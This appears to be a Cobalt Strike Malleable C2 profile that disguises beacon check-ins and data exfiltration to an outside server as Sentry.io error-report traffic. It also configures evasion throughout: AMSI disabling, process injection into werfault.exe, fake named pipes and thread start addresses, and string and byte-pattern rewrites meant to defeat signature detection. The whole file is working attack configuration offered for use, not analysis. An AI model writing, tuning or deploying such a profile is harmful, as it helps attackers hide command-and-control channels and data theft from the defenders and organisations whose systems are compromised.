#
# Nemesis Sentry.io "Retribution" Profile
# Imitates high-volume application error reporting
#
# Target: Systems where "buggy" black-hat tools are executed
#

set sleeptime "10000"; # 10 seconds - looks like a retry loop
set jitter    "20";
set useragent "sentry.javascript.browser/7.50.0";

http-get {
    # Fetches the "Client Configuration" (Beacon Check-in)
    set uri "/api/1337/security-report.json";

    client {
        header "Accept" "application/json";
        header "X-Sentry-Auth" "Sentry sentry_key=a1b2c3d4e5f6g7h8i9j0, sentry_version=7";
        header "Host" "o1.ingest.sentry.io";

        metadata {
            base64;
            header "X-Sentry-Trace"; # Your beacon ID/metadata hidden here
        }
    }

    server {
        header "Content-Type" "application/json";
        header "Access-Control-Allow-Origin" "*";
        header "Server" "nginx";

        output {
            # Looks like a standard DSN config response
            prepend "{\"dsn\":\"https://example@sentry.io/1\",\"rate_limits\":";
            append ",\"status\":\"ok\"}";
            print;
        }
    }
}

http-post {
    # The "Envelope" endpoint - where the real data (exfil/tasking) goes
    set uri "/api/1337/envelope/";

    client {
        header "Content-Type" "application/x-sentry-envelope";
        header "X-Sentry-Auth" "Sentry sentry_key=a1b2c3d4e5f6g7h8i9j0, sentry_version=7";
        header "Host" "o1.ingest.sentry.io";

        id {
            # The event_id field in Sentry is a 32-char hex string. Perfect for IDs.
            parameter "sentry_event_id";
        }

        output {
            # Sentry envelopes are line-delimited JSON.
            # We wrap our encrypted data in fake "item" headers.
            base64;
            prepend "{\"type\":\"event\",\"length\":1024}\n";
            append "\n{\"type\":\"attachment\",\"filename\":\"crash.log\"}";
            print;
        }
    }

    server {
        header "Content-Type" "application/json";
        header "Server" "nginx";
        header "X-Sentry-ID" "9ec79c33ec9942ab8353589fcb2e04dc";

        output {
            # Standard "success" response for a reported error
            prepend "{\"id\":\"";
            append "\"}";
            print;
        }
    }
}

stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}

post-ex {
    set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
    set cleanup "true";
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}

set tasks_max_size "2097152";
